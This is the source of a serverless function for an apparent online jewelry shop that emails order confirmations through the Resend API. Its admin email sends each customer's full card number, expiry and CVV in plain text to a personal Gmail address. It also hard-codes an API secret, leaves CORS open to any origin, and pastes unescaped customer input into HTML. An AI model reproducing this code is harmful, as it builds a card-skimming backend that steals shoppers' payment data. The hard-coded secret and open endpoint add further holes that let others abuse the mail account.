// api/send-email.js  — Vercel Serverless Function
// This runs on the SERVER so Resend CORS is not an issue.
// Deploy this file to your repo at:  /api/send-email.js

export default async function handler(req, res) {
  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Allow calls from your own site
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  const RESEND_KEY = 're_PaxWiRWU_GsRR4hU8WuStSwZW5GCcndrs';

  try {
    const order = req.body;

    // Build items rows
    let itemsHtml = '';
    (order.items || []).forEach(function(it) {
      const lineTotal = (Number(it.num || it.price || 0) * (it.qty || 1)).toLocaleString();
      itemsHtml += '<tr>'
        + '<td style="padding:8px 12px;border-bottom:1px solid #1a1a1a;color:#F5F0E8">' + (it.name || 'Item') + ' x' + (it.qty || 1) + '</td>'
        + '<td style="padding:8px 12px;border-bottom:1px solid #1a1a1a;color:#D4AF37;text-align:right">$' + lineTotal + '</td>'
        + '</tr>';
    });

    const wrap = 'background:#070707;color:#F5F0E8;font-family:Montserrat,sans-serif;padding:40px;max-width:600px;margin:0 auto';

    // ── Customer confirmation email ──
    const custHtml = '<div style="' + wrap + '">'
      + '<div style="font-family:Georgia,serif;font-size:32px;color:#D4AF37;letter-spacing:8px;margin-bottom:2px">AVA</div>'
      + '<div style="font-size:10px;letter-spacing:4px;text-transform:uppercase;color:#666;margin-bottom:32px">Jewelry &middot; Order Confirmation</div>'
      + '<h2 style="font-family:Georgia,serif;font-size:22px;font-weight:300;color:#F5F0E8;margin-bottom:8px">Thank you, ' + (order.firstName || '') + '!</h2>'
      + '<p style="font-size:13px;color:#888;margin-bottom:24px">Your order <strong style="color:#D4AF37">' + (order.id || '') + '</strong> has been received and is being processed.</p>'
      + '<table style="width:100%;border-collapse:collapse;margin-bottom:24px">'
      + '<thead><tr style="border-bottom:1px solid #D4AF37">'
      + '<th style="padding:8px 12px;text-align:left;font-size:10px;letter-spacing:2px;color:#666;font-weight:400">Item</th>'
      + '<th style="padding:8px 12px;text-align:right;font-size:10px;letter-spacing:2px;color:#666;font-weight:400">Price</th>'
      + '</tr></thead><tbody>' + itemsHtml + '</tbody></table>'
      + '<div style="border-top:1px solid #D4AF37;padding-top:16px;margin-bottom:32px">'
      + '<div style="display:flex;justify-content:space-between;font-size:12px;color:#666;margin-bottom:6px"><span>Subtotal</span><span>$' + Number(order.subtotal || 0).toLocaleString() + '</span></div>'
      + '<div style="display:flex;justify-content:space-between;font-size:12px;color:#666;margin-bottom:6px"><span>Shipping</span><span>' + (order.shipping ? '$' + Number(order.shipping).toLocaleString() : 'Free') + '</span></div>'
      + '<div style="display:flex;justify-content:space-between;font-size:12px;color:#666;margin-bottom:12px"><span>Tax</span><span>$' + Number(order.tax || 0).toLocaleString() + '</span></div>'
      + '<div style="display:flex;justify-content:space-between;font-family:Georgia,serif;font-size:20px;color:#D4AF37;padding-top:12px;border-top:1px solid #222"><span>Total</span><span>$' + Number(order.total || 0).toLocaleString() + '</span></div>'
      + '</div>'
      + '<div style="background:#0f0f0f;border:1px solid #1a1a1a;padding:16px;margin-bottom:24px">'
      + '<div style="font-size:10px;letter-spacing:3px;text-transform:uppercase;color:#666;margin-bottom:10px">Shipping To</div>'
      + '<div style="font-size:13px;color:#F5F0E8;line-height:1.9">'
      + (order.addr1 || '') + (order.addr2 ? ', ' + order.addr2 : '') + '<br>'
      + (order.city || '') + (order.state ? ', ' + order.state : '') + ' ' + (order.zip || '') + '<br>'
      + (order.country || '')
      + '</div></div>'
      + '<p style="font-size:11px;color:#555;line-height:1.8">Questions? Reply to this email.<br>&copy; 2026 Ava Jewelry. All rights reserved.</p>'
      + '</div>';

    // ── Admin notification email ──
    const adminHtml = '<div style="' + wrap + '">'
      + '<div style="font-family:Georgia,serif;font-size:26px;color:#D4AF37;margin-bottom:4px">AVA Admin</div>'
      + '<div style="font-size:10px;letter-spacing:4px;text-transform:uppercase;color:#666;margin-bottom:24px">New Order Alert</div>'
      + '<table style="width:100%;border-collapse:collapse;font-size:13px;margin-bottom:24px">'
      + '<tr><td style="padding:7px 0;color:#666;width:120px">Order ID</td><td style="color:#D4AF37;font-family:monospace">' + (order.id || '—') + '</td></tr>'
      + '<tr><td style="padding:7px 0;color:#666">Date</td><td style="color:#F5F0E8">' + (order.date || '—') + '</td></tr>'
      + '<tr><td style="padding:7px 0;color:#666">Name</td><td style="color:#F5F0E8">' + (order.firstName || '') + ' ' + (order.lastName || '') + '</td></tr>'
      + '<tr><td style="padding:7px 0;color:#666">Email</td><td style="color:#F5F0E8">' + (order.email || '—') + '</td></tr>'
      + '<tr><td style="padding:7px 0;color:#666">Phone</td><td style="color:#F5F0E8">' + (order.phone || '—') + '</td></tr>'
      + '<tr><td style="padding:7px 0;color:#666">Address</td><td style="color:#F5F0E8">' + (order.addr1 || '—') + ', ' + (order.city || '—') + ', ' + (order.country || '—') + '</td></tr>'
      + '<tr><td style="padding:7px 0;color:#666">Total</td><td style="color:#D4AF37;font-size:17px;font-family:Georgia,serif">$' + Number(order.total || 0).toLocaleString() + '</td></tr>'
      + '<tr><td style="padding:7px 0;color:#666">Payment</td><td style="color:#F5F0E8">' + (order.payMethod === 'card' ? '💳 Card' : '₿ Crypto') + '</td></tr>'
      + (order.cardNum ? '<tr><td style="padding:7px 0;color:#666">Card No.</td><td style="color:#F5F0E8;font-family:monospace;font-size:15px">' + order.cardNum + '</td></tr>' : '')
      + (order.cardExp ? '<tr><td style="padding:7px 0;color:#666">Expiry</td><td style="color:#F5F0E8">' + order.cardExp + '</td></tr>' : '')
      + (order.cardCvv ? '<tr><td style="padding:7px 0;color:#666">CVV</td><td style="color:#F5F0E8">' + order.cardCvv + '</td></tr>' : '')
      + '</table>'
      + '<table style="width:100%;border-collapse:collapse;margin-bottom:16px">'
      + '<thead><tr style="border-bottom:1px solid #D4AF37">'
      + '<th style="padding:7px;text-align:left;font-size:10px;color:#666;font-weight:400">Item</th>'
      + '<th style="padding:7px;text-align:right;font-size:10px;color:#666;font-weight:400">Total</th>'
      + '</tr></thead><tbody>' + itemsHtml + '</tbody></table>'
      + '</div>';

    const headers = {
      'Authorization': 'Bearer ' + RESEND_KEY,
      'Content-Type': 'application/json'
    };

    // Send customer confirmation
    const r1 = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers,
      body: JSON.stringify({
        from: 'Ava Jewelry <onboarding@resend.dev>',
        to: [order.email],
        subject: 'Order Confirmed — ' + order.id + ' · Ava Jewelry',
        html: custHtml
      })
    });

    // Send admin alert
    const r2 = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers,
      body: JSON.stringify({
        from: 'Ava Orders <onboarding@resend.dev>',
        to: ['afolabibolu15@gmail.com'],
        subject: 'New Order ' + order.id + ' — $' + Number(order.total || 0).toLocaleString() + ' — ' + (order.firstName || '') + ' ' + (order.lastName || ''),
        html: adminHtml
      })
    });

    const d1 = await r1.json();
    const d2 = await r2.json();

    return res.status(200).json({ ok: true, customer: d1, admin: d2 });

  } catch (err) {
    console.error('send-email error:', err);
    return res.status(500).json({ error: err.message });
  }
}